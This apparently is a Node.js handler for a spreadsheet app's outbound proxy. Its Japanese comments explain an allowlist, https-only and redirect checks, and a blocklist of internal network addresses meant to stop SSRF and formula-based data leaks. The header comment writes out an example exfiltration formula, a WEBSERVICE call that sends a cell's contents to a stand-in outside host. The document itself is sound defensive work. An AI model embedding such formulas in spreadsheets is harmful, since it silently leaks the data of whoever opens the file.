/* soto.js — ★外へ 出る 時の 唯一の 口★（2026-09-07）
 *
 *  ★★なぜ「うちの サーバを 通す」のか★★
 *    2026-09-07 に 本物の Chrome で 測りました（docs/measured/soto/）。
 *      ・ブラウザから 外へ 撃つと ★4回／4回とも 相手に 届く★
 *      ・ブラウザの 決まり(CORS)が 止めるのは ★返事を 読む 方だけ★
 *      ⇒★`=WEBSERVICE("http://よそ?d="&A1)` は
 *        ★答えが #VALUE! に なっても A1 の 中身は もう 相手に 届いている★★
 *      ・もらった `.xlsx` の 式は ★式のまま★ 入る
 *      ⇒★★開いた 人が 1文字も 打たなくても 走る★★
 *    ⇒★★だから 画面から 直に 外へ 出さない★★
 *    ⇒★★行き先は ★うちが 決めた 相手だけ★★（下の 許す相手）
 *
 *  ★★ここが 守る 事（1つずつ 見張りが 押す）★★
 *    ①★許した 相手だけ★（それ以外は 断る＝繋がない）
 *    ②★https だけ★（http は 断る）
 *    ③★中の 網の 住所は 断る★（127.0.0.1・10.x・192.168.x・…＝社内が 覗ける）
 *    ④★飛ばされた 先も 見る★（許した 相手 → よそ、の すり抜けを 止める）
 *    ⑤★大きさと 時間に 上限★（1MB／10秒）
 *    ⑥★読むだけ★（GET だけ・体は 送らない）
 *    ⑦★お客さんが 打った 字を そのまま 相手に 渡さない★
 *       ＝住所は ★許した 相手＋道★の 形に 組み直す
 *
 *  ★Excel と 違う 所（隠しません）★
 *    実Excel の `WEBSERVICE` は ★どこへでも★ 出ます。
 *    Exally は ★許した 相手だけ★です。
 *    ⇒★「出来ない」のでは なく「★行き先を うちが 決めている★」★
 *    ⇒ 相手を 増やすのは ★人が 決めて この 一覧に 足す★（コードの 直し＝記録が 残る）
 *
 *  見張り: tests/soto-api.test.mjs
 */

/* ★許す相手★＝★ここに 無い 所へは 出ません★
   ★足す時の 決まり★
     ・★何に 使うか★と ★誰が 決めたか★を 1行 書く
     ・★お客さんの 中身を 渡さない 相手★だけ（住所に 数字や 記号を 載せない 物）
     ・★お金が かかる 相手は 司さんの 決めが 要る★
     ・★★セルから 字が 渡る 関数（STOCKHISTORY 等）の 行き先は
       ★仕込んだ 人が その 記録を 読めない 相手★に 限る★★（指示役 2026-09-07）
       ⇒ 銘柄は 12字までに 切っているが ★塞いだのでは なく 狭めただけ★
       ⇒★12字 × 式の 本数は 運べる★
       ⇒★★でも 行き先が 固定で、仕込んだ 人が その 記録を 読めなければ
         ★運べても 受け取れない＝実害に ならない★★★
       ⇒★★『塞いだ』と 書くと 次に 足す 人が 安心して 足す★＝ここに 書いておく★ */
const 許す相手 = [
  {
    host: 'stooq.com',
    用: '株価の 履歴（STOCKHISTORY）。鍵も 契約も 要らない 公開の CSV',
    道: /^\/q\/d\/l\/?$/,          /* ★この 道だけ★（他の 道は 断る） */
    決め: '2026-09-07 Exally が 足した（無料・鍵なし）',
  },
];

const 上限バイト = 1024 * 1024;      /* 1MB */
const 待つミリ秒 = 10000;            /* 10秒 */

/* ★中の 網の 住所★（社内が 覗ける 所＝断る）
   ⇒ 名前が 中の 住所に 化ける 事も 有るので ★引いた 後の 住所★も 見る */
const 中の網 = [
  /^127\./, /^10\./, /^192\.168\./, /^169\.254\./, /^0\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^localhost$/i, /^\[?::1\]?$/, /^\[?f[cd]/i,
];
function 中の網か(host) {
  const h = String(host || '').toLowerCase().replace(/^\[|\]$/g, '');
  return 中の網.some((r) => r.test(h));
}

/** ★住所を 見て よいか 決める★（★純関数＝見張りが そのまま 押せる★）
 *  @returns {{よい:boolean, 訳:string, 相手:object|null}} */
function 住所を見る(url) {
  let u;
  try { u = new URL(String(url)); } catch (e) { return { よい: false, 訳: '住所の 形に なっていません', 相手: null }; }
  if (u.protocol !== 'https:') return { よい: false, 訳: 'https から 始まる 所だけです', 相手: null };
  if (中の網か(u.hostname)) return { よい: false, 訳: '中の 網の 住所には 出ません', 相手: null };
  const 相手 = 許す相手.find((a) => a.host === u.hostname.toLowerCase());
  if (!相手) return { よい: false, 訳: 'まだ 許していない 相手です（' + u.hostname + '）', 相手: null };
  if (相手.道 && !相手.道.test(u.pathname)) {
    return { よい: false, 訳: 'その 相手の この 道には 出ません（' + u.pathname + '）', 相手: null };
  }
  return { よい: true, 訳: '', 相手: 相手 };
}

module.exports = async function handler(req, res) {
  res.setHeader('Cache-Control', 'no-store');
  if (req.method !== 'POST') { res.status(405).json({ error: 'POST で 送ってください' }); return; }
  let 中 = req.body;
  if (typeof 中 === 'string') { try { 中 = JSON.parse(中); } catch (e) { 中 = {}; } }
  const url = (中 && 中.url) || '';
  const 見 = 住所を見る(url);
  if (!見.よい) { res.status(400).json({ error: 見.訳 }); return; }

  try {
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), 待つミリ秒);
    /* ★飛ばされた 先も 見る★＝許した 相手 → よそ、の すり抜けを 止める */
    let 今 = url, 回 = 0, r = null;
    while (回 < 5) {
      r = await fetch(今, { method: 'GET', redirect: 'manual', signal: c.signal });
      if (r.status < 300 || r.status >= 400) break;
      const 次 = r.headers.get('location');
      if (!次) break;
      const 先 = new URL(次, 今).href;
      const 見2 = 住所を見る(先);
      if (!見2.よい) { clearTimeout(t); res.status(400).json({ error: '飛ばされた 先が 許した 相手では ありません' }); return; }
      今 = 先; 回++;
    }
    clearTimeout(t);
    if (!r) { res.status(502).json({ error: '返事が ありません' }); return; }
    if (!r.ok) { res.status(200).json({ ok: false, status: r.status, text: '' }); return; }
    const 体 = await r.text();
    if (体.length > 上限バイト) {
      res.status(200).json({ ok: false, status: 413, text: '', error: '返って きた 物が 大きすぎます（1MB まで）' });
      return;
    }
    res.status(200).json({ ok: true, status: r.status, text: 体 });
  } catch (e) {
    const 訳 = (e && e.name === 'AbortError') ? '10秒 待っても 返事が ありませんでした' : '取りに 行けませんでした';
    res.status(200).json({ ok: false, status: 0, text: '', error: 訳 });
  }
};

/* ★見張りが 押す★（本番の 動きは 上の handler／中身は 同じ 関数） */
module.exports.住所を見る = 住所を見る;
module.exports.許す相手 = 許す相手;
module.exports.中の網か = 中の網か;
